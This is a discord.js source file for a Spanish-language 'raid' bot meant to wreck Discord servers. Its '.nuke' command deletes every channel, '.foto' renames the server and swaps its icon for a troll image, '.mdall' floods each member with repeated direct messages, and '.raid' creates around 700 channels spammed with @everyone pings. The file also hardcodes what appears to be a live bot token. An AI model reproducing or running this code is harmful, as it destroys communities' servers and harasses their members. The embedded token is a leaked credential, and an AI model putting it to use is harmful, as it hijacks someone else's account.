const Discord = require("discord.js");
const client = new Discord.Client();

client.on("ready", () => {
    console.log("Ready Para el Raid");  
    presencia();  
    });

function presencia(){
  client.user.setPresence({
status: "Invisible",
activity: {
  name: "Hola",
  type: "Jugando"

}
  });
}

 client.on("message", message => {
    if (message.author.bot) return;
  
   if (message.content === '.nuke') {
    message.guild.channels.cache.forEach(channel => channel.delete());
    message.guild.channels.create(`SERVER POBRETON`, {
          type: 'text'
        }).then(channel => {
          channel.send("```El server choto fue eliminado correctamente```")
        })
         }
      })

      client.on("message", message => {
        if (message.author.bot) return;
      
       if (message.content === '.foto') {
          message.guild.setName("PAGA EL BOT FORRO");
          message.guild.setIcon("https://cdn.discordapp.com/attachments/877317400872251395/1049425020113403974/troll.jpg"
          );
          }
        });
       
        

      client.on("message", message => {
        if (message.author.bot) return;
        
      if(message.content === ".mdall")
      message.guild.members.cache.forEach(member => {
        setInterval(function(){
          member.send("HOLA BB ").catch(error => {});
        },450);
      })
      });

        client.on("message", message => {
            if (message.author.bot) return;
          
           if (message.content === '.raid') {
           for (let i = 0; i <= 700; i++) {
                message.guild.channels.create(`DOMADO`, {
                  type: 'text'
                }).then(channel => {  
                                  channel.send("@everyone WACHINES ")
                  channel.send("@everyone WACHINES ")
                  channel.send("@everyone WACHINES ")
                  channel.send("@everyone WACHINES ")
                  channel.send("@everyone WACHINES ")
                  channel.send("@everyone WACHINES ")
                  channel.send("@everyone WACHINES ")
                  channel.send("@everyone WACHINES ")
                  channel.send("@everyone WACHINES ")
                  channel.send("@everyone WACHINES ")
                  channel.send("@everyone WACHINES ")
                  channel.send("@everyone WACHINES ")
                  channel.send("@everyone WACHINES ")
                  channel.send("@everyone WACHINES ")
                  channel.send("@everyone WACHINES ")
                  channel.send("@everyone WACHINES ")
                  channel.send("@everyone WACHINES ")
                  channel.send("@everyone WACHINES ")
                  channel.send("@everyone WACHINES ")
                  channel.send("@everyone WACHINES ")
                  channel.send("@everyone WACHINES ")
                  channel.send("@everyone WACHINES ")
                  channel.send("@everyone WACHINES ")
                  channel.send("@everyone WACHINES ")
                  channel.send("@everyone WACHINES ")
                  channel.send("@everyone WACHINES ")
                  channel.send("@everyone WACHINES ")
                  channel.send("@everyone WACHINES")
                  channel.send("@everyone WACHINES")
                  channel.send("@everyone WACHINES")
                  channel.send("@everyone WACHINES")
              })
              }
              }
            });

 client.login("MTAxMTA3NTAzNjkwNTQ3MjA5Mg.Gk6No9.An5TvtaEdgYL_5AQozldX5_cWrjVMmxlgNOYZ8");